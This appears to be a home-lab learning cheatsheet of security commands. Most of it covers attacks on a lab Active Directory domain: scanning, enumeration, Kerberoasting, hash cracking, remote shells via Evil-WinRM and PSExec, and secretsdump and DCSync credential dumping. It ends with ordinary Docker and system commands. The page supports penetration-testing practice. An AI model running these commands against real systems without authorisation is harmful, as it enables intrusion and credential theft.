---
title: "Commands Cheatsheet"
permalink: /docs/learning/commands/
---

# Commands Cheatsheet

Quick reference for common security tools and commands.

---

## Network Discovery

```bash
# Find live hosts on network
nmap -sn 192.168.56.0/24

# Quick port scan (top 1000)
nmap <target>

# Full port scan with versions
nmap -sV -p- --min-rate 1000 <target>

# Scan specific ports
nmap -sV -p 22,80,443,445,3389 <target>

# Scan host that blocks ping
nmap -Pn <target>

# Check your IP
ip a
```

---

## Active Directory Enumeration

```bash
# Enumerate users via LDAP
ldapsearch -x -H ldap://192.168.56.10 -b "dc=lab,dc=local"

# CrackMapExec - check access
crackmapexec smb 192.168.56.10 -u 'tuser' -p 'password'

# CrackMapExec - list users
crackmapexec smb 192.168.56.10 -u 'tuser' -p 'password' --users

# BloodHound collection
bloodhound-python -u 'tuser' -p 'password' -d lab.local -ns 192.168.56.10 -c all
```

---

## Credential Attacks

```bash
# Kerberoasting - get service tickets
impacket-GetUserSPNs lab.local/tuser:password -dc-ip 192.168.56.10 -request

# AS-REP Roasting - find accounts without preauth
impacket-GetNPUsers lab.local/ -dc-ip 192.168.56.10 -usersfile users.txt

# Crack hashes with hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Remote Access

```bash
# Evil-WinRM (requires valid creds)
evil-winrm -i 192.168.56.10 -u Administrator -p 'password'

# PSExec via Impacket
impacket-psexec lab.local/Administrator:password@192.168.56.10

# SMB access
smbclient -L //192.168.56.10 -U tuser
```

---

## Post-Exploitation

```bash
# Dump hashes (requires admin)
impacket-secretsdump lab.local/Administrator:password@192.168.56.10

# DCSync attack
impacket-secretsdump lab.local/Administrator:password@192.168.56.10 -just-dc
```

---

## Docker Commands

```bash
docker run -d --name splunk ...  # Start container in background
docker ps                        # List running containers
docker ps -a                     # List ALL containers (including stopped)
docker logs splunk               # View container output/errors
docker stop splunk               # Stop container
docker rm splunk                 # Remove container
```

---

## Linux System Info

```bash
hostnamectl          # OS and hostname info
free -h              # RAM usage (human readable)
df -h                # Disk usage (human readable)
lscpu                # CPU info
lsblk                # Disk info
```

---

## Windows PowerShell

```powershell
# Test network connection
Test-NetConnection 192.168.1.186 -Port 9997

# Check hostname
hostname

# List services
Get-Service | Where-Object {$_.Status -eq "Running"}
```

---

## Linux Terminal Shortcuts

| Shortcut | Action |
|----------|--------|
| Ctrl + U | Clear line before cursor |
| Ctrl + K | Clear line after cursor |
| Ctrl + W | Delete word backward |
| Ctrl + C | Cancel current command |
| Ctrl + L | Clear screen |
| Ctrl + R | Search command history |
| Right Arrow | Accept zsh suggestion |
